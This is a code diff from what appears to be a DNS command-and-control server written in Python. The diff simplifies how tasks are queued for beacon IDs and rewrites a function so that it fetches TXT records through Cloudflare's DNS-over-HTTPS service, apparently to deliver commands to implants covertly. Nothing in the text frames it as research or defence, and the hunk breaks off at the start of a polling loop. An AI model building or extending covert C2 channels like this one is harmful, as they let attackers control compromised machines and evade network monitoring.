@@ -64,21 +64,33 @@ class C2Resolver(BaseResolver):
         return reply
 
 def add_task(bid: str, task: dict):
-    payload = json.dumps(task).encode()
-    b64 = base64.b64encode(payload).decode()
-    chunks = [b64[i:i+CHUNK] for i in range(0, len(b64), CHUNK)]
-    with LOCK:
-        TASKS.setdefault(bid, []).append({"task": task, "chunks": chunks, "sent_chunks": 0})
-    log_event("dns_c2_server", f"Added DNS task for {bid}: {task}".encode())
+    """Add a task for a specific beacon ID"""
+    try:
+        if bid not in TASKS:
+            TASKS[bid] = []
+        TASKS[bid].append(task)
+        log_event("dns_c2", f"Added task for {bid}: {task}".encode())
+        return True
+    except Exception as e:
+        log_event("dns_c2", f"Error adding task: {e}".encode())
+        return False
 
 def doh_query(subdomain: str):
-    """
-    Perform a DoH lookup for TXT records of <subdomain>.<DOMAIN>.
-    """
-    dns_query = base64.urlsafe_b64encode(DNSRecord.question(subdomain + "." + DOMAIN, "TXT").pack()).decode()
-    headers = {"Accept": "application/dns-message"}
-    r = requests.get(f"{DOH_URL}?dns={dns_query}", headers=headers, timeout=10)
-    return DNSRecord.parse(r.content)
+    """Query using DNS over HTTPS"""
+    try:
+        url = "https://cloudflare-dns.com/dns-query"
+        headers = {"accept": "application/dns-json"}
+        params = {"name": subdomain, "type": "TXT"}
+        
+        response = requests.get(url, headers=headers, params=params, timeout=10)
+        if response.status_code == 200:
+            data = response.json()
+            if "Answer" in data:
+                return data["Answer"][0]["data"]
+        return None
+    except Exception as e:
+        log_event("dns_c2", f"DoH query error: {e}".encode())
+        return None
 
 def doh_loop():
     """
